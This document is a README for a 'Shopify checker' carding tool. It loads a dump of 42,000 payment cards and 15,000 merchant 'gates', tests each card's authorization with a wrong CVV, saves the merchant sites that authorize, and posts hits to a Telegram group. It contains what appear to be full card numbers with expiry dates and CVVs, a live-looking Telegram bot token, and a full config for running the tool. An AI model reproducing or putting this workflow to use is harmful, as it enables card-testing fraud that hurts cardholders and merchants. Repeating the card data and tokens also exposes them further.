# Authorization Discovery Workflow

## How It Works

### The Process

```
1. Load 42,000 cards from /home/null/Desktop/42000Dump.txt
2. Load 15,000 gates from /home/null/Desktop/15000ShopifyGates
3. For each card:
   - Cycle through ALL gates (or prioritized list)
   - Test authorization (NOT charging)
   - If gate authorizes → save to valid_gates.json
4. In future runs:
   - Prioritize gates that worked before (5x weight)
   - Still test unknown gates (1x weight)
   - Build database of best gates
```

### Authorization Testing (FREE)

**What happens:**
- Card is tested with WRONG CVV
- Gate attempts authorization
- Returns: "CVV Mismatch" or "Approved" (but no charge)
- **Cost: $0.00** (no actual charges)

**When gate works:**
- Gate successfully processes authorization
- Gate is saved to `valid_gates.json`
- Success rate is tracked
- Gate is prioritized in future runs

### Example Run

**First Run (Discovery):**
```
Card 1: 5137704502263801|12|25|443
  → Gate 1: https://gate1.com → ❌ Declined
  → Gate 2: https://gate2.com → ✅ Authorized! (saved)
  → Gate 3: https://gate3.com → ❌ Declined
  → Gate 4: https://gate4.com → ✅ Authorized! (saved)
  ... (cycles through all 15,000 gates)

Card 2: 4978742321301530|12|25|932
  → Gate 1: https://gate1.com → ❌ Declined
  → Gate 2: https://gate2.com → ✅ Authorized! (already saved, +1 success)
  → Gate 3: https://gate3.com → ❌ Declined
  → Gate 4: https://gate4.com → ✅ Authorized! (already saved, +1 success)
  ... (cycles through all 15,000 gates)

Result: valid_gates.json with ~100-300 gates that authorized
```

**Second Run (Optimized):**
```
Card 3: 4970407612792304|12|25|714
  → Gate 2: https://gate2.com (valid, weight 5) → ✅ Authorized!
  → Gate 4: https://gate4.com (valid, weight 5) → ✅ Authorized!
  → Gate 2: https://gate2.com (valid, weight 5) → ✅ Authorized!
  → Gate 4: https://gate4.com (valid, weight 5) → ✅ Authorized!
  → Gate 2: https://gate2.com (valid, weight 5) → ✅ Authorized!
  → Gate 5: https://gate5.com (unknown, weight 1) → ❌ Declined
  → Gate 4: https://gate4.com (valid, weight 5) → ✅ Authorized!
  ... (80% valid gates, 20% unknown gates)

Result: Higher success rate, still discovering new gates
```

## Configuration

### config.json

```json
{
  "telegram": {
    "bot_token": "7984658748:AAF1QfpAPVg9ncXkA4NKRohqxNfBZ8Pet1s",
    "group_id": "-1003538559040",
    "bot_credit": "@MissNullMe"
  },
  "cards_file": "/home/null/Desktop/42000Dump.txt",
  "gates_directory": "/home/null/Desktop/15000ShopifyGates",
  "valid_gates_file": "valid_gates.json",
  "auth_only": true,
  "max_gates": null,
  "mode": "discovery",
  "discovery": {
    "cycle_through_all_gates": true,
    "save_valid_gates_on_auth": true,
    "prioritize_valid_gates": true,
    "valid_gate_weight": 5,
    "invalid_gate_weight": 1,
    "cards_per_gate": 3,
    "test_type": "authorization"
  }
}
```

### Settings Explained

**cycle_through_all_gates: true**
- Cycles through ALL 15,000 gates when checking cards
- Tests each card against many gates
- Discovers which gates work

**save_valid_gates_on_auth: true**
- When a gate successfully authorizes → save it
- Tracks success rate
- Builds database of working gates

**prioritize_valid_gates: true**
- In future runs, use valid gates more often
- 5x weight for valid gates
- 1x weight for unknown gates

**valid_gate_weight: 5**
- Valid gates appear 5 times in rotation
- Example: If gate worked before, test it 5x more

**invalid_gate_weight: 1**
- Unknown gates appear 1 time in rotation
- Still discovers new gates

**cards_per_gate: 3**
- Test 3 different cards per gate
- More cards = better accuracy
- Fewer cards = faster discovery

**test_type: "authorization"**
- Tests for authorization (FREE)
- NOT charging (no cost)
- Uses wrong CVV to avoid charges

## Workflow

### Phase 1: Initial Discovery

**Goal:** Find gates that authorize cards

**Process:**
1. Load 42,000 cards
2. Load 15,000 gates
3. For each card:
   - Test on ALL gates
   - Save gates that authorize
4. Build `valid_gates.json`

**Time:** Several hours (15,000 gates × 3 cards × 5 seconds = ~62 hours)

**Result:** Database of 100-500 gates that work

### Phase 2: Optimized Testing

**Goal:** Use known good gates, discover more

**Process:**
1. Load cards
2. Load gates (prioritized)
3. For each card:
   - 80% tests on valid gates
   - 20% tests on unknown gates
4. Update `valid_gates.json`

**Time:** Much faster (80% success rate)

**Result:** Higher efficiency, continuous discovery

## Output

### valid_gates.json

```json
{
  "total_valid": 156,
  "total_tested": 1247,
  "valid_gates": [
    {
      "url": "https://donate.example.com",
      "success_count": 45,
      "failure_count": 5,
      "last_tested": "2024-01-15 14:30:45",
      "success_rate": 90.0,
      "gateway": "Shopify"
    },
    {
      "url": "https://charity.example.org",
      "success_count": 38,
      "failure_count": 12,
      "last_tested": "2024-01-15 14:25:30",
      "success_rate": 76.0,
      "gateway": "Shopify"
    }
  ]
}
```

### Telegram Notifications

Every authorization sends notification:

```
━━━━━━━━━━━━━━━━━━━━
✅ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ✅
━━━━━━━━━━━━━━━━━━━━

𝗖𝗖 : 5137704502263801|12|25|443
𝗦𝘁𝗮𝘁𝘂𝘀 : Approved ✅
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : CVV Mismatch

━━━━━━━━━━━━━━━━━━━━
📊 𝗖𝗔𝗥𝗗 𝗜𝗡𝗙𝗢
━━━━━━━━━━━━━━━━━━━━

𝗕𝗜𝗡 : 513770
𝗧𝘆𝗽𝗲 : MASTERCARD DEBIT
𝗟𝗲𝘃𝗲𝗹 : 3DS 🔐
𝗕𝗮𝗻𝗸 : CHASE BANK
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : UNITED STATES 🇺🇸

━━━━━━━━━━━━━━━━━━━━
🌐 𝗚𝗔𝗧𝗘 𝗜𝗡𝗙𝗢
━━━━━━━━━━━━━━━━━━━━

𝗚𝗮𝘁𝗲 : Shopify Authorization
𝗨𝗥𝗟 : https://donate.example.com

━━━━━━━━━━━━━━━━━━━━
⏰ 𝗧𝗜𝗠𝗘 : 2024-01-15 14:30:45 EST
🤖 𝗕𝗼𝘁 𝗕𝘆 : @MissNullMe
━━━━━━━━━━━━━━━━━━━━
```

## Key Points

### ✅ Authorization Testing (FREE)
- Uses wrong CVV
- No actual charges
- $0.00 cost
- Finds working gates

### ✅ Cycles Through ALL Gates
- Tests each card on many gates
- Discovers which gates work
- Builds database

### ✅ Saves Valid Gates
- When gate authorizes → saved
- Tracks success rate
- Used in future runs

### ✅ Prioritizes Good Gates
- Valid gates: 5x weight
- Unknown gates: 1x weight
- 80% efficiency, 20% discovery

### ✅ Continuous Learning
- System gets smarter over time
- Success rate improves
- Database grows

## Summary

**What It Does:**
1. Loads 42,000 cards
2. Loads 15,000 gates
3. Tests cards for authorization (FREE)
4. Saves gates that work
5. Prioritizes them in future runs

**Result:**
- Database of 100-500 working gates
- 80-90% success rate
- Continuous discovery
- $0.00 cost (authorization only)

**Usage:**
```bash
./run_checker.sh
```

Monitor Telegram for real-time results!
